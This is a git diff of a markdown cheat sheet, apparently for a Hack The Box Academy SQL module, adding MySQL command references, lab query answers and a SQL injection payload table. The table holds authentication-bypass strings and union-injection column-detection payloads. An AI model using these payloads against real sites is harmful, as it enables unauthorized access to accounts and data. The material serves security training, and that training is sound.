@@ -8,16 +8,16 @@
 | **Command**   | **Description**   |
 | --------------|-------------------|
 | **General** |
-| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
+| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database [Intro to MySQL](https://academy.hackthebox.com/module/33/section/183) |
 | `SHOW DATABASES` | List available databases |
 | `USE users` | Switch to database |
 | **Tables** |
 | `CREATE TABLE logins (id INT, ...)` | Add a new table |
 | `SHOW TABLES` | List available tables in current database |
 | `DESCRIBE logins` | Show table properties and columns |
-| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
+| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table [](https://academy.hackthebox.com/module/33/section/190) |
 | `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
-| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
+| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values. Note: we have to specify the 'WHERE' clause with UPDATE, in order to specify which records get updated. The 'WHERE' clause will be discussed next. |
 | **Columns** |
 | `SELECT * FROM table_name` | Show all columns in a table |
 | `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
@@ -31,11 +31,16 @@
 | `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
 | `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
 | `SELECT * FROM logins LIMIT 2` | Only show first two results |
-| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
+| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 [Query Results](https://academy.hackthebox.com/module/33/section/191) |
 | `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
 | `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |
+| `select * from departments where dept_name like 'Develop%';` | Will get the department number for the `Development` department. |
+| `select * from employees where first_name like 'Bar%' and hire_date = '1990-01-01' LIMIT 2;` | Retrieve the last name of the employee whose first name starts with "Bar" AND who was hired on `1990-01-01`. |
 
-## MySQL Operator Precedence
+## MySQL Operator Precedence  
+
+>[SQL Operators](https://academy.hackthebox.com/module/33/section/192)  
+
 * Division (`/`), Multiplication (`*`), and Modulus (`%`)
 * Addition (`+`) and Subtraction (`-`)
 * Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
@@ -43,13 +48,35 @@
 * AND (`&&`)
 * OR (`||`)
 
-## SQL Injection
+>Query: In the 'titles' table, what is the number of records WHERE the employee number is **greater** than `10000` **OR** their title does **NOT** contain `engineer`?  
+
+```
+select * from titles WHERE emp_no > 10000 OR title != 'engineer%';
+```  
+
+## SQL Injection  
+
+>[Intro to SQL Injections & Types of SQL Injections](https://academy.hackthebox.com/module/33/section/193)  
+
+### Identify SQLi  
+
+| **Payload**   | **URL Encoded**   |
+| --------------|-------------------|
+| `'` | %27 |
+| `"` | %22 |
+| `#` | %23 |
+| `;` | %3B |
+| `)` | %29 |
+
+
 | **Payload**   | **Description**   |
 | --------------|-------------------|
 | **Auth Bypass** |
-| `admin' or '1'='1` | Basic Auth Bypass |
-| `admin')-- -` | Basic Auth Bypass With comments |
-| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
+| `admin' or '1'='1` | Basic Auth Bypass [Subverting Query Logic - Authentication Bypass](https://academy.hackthebox.com/module/33/section/194) |
+| `tom' or '1'='1` | Log in as the user 'tom'. |
+| `admin')-- -` | Basic Auth Bypass With comments [Using Comments](https://academy.hackthebox.com/module/33/section/799) |
+| `any' OR id =5);# | Login as the user with the id 5 to get the flag. |
+| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) | PayloadsAllTheThings SQL Injection Examples |
 | **Union Injection** |
 | `' order by 1-- -` | Detect number of columns using `order by` |
 | `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
